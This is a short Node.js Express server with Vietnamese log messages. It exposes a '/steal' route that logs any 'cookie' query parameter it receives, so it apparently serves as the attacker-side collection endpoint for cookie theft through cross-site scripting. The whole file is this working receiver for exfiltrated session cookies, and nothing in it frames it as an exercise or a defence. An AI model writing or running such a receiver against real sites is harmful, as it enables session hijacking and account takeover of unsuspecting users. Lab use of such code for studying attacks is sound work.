const express = require('express');
const app = express();
const port = 8081;

app.get('/steal', (req, res) => {
  console.log('[+] Cookie nhận được:', req.query.cookie);
  res.send('OK');
});

app.listen(port, () => {
  console.log(`Server đang chạy tại http://localhost:${port}`);
});
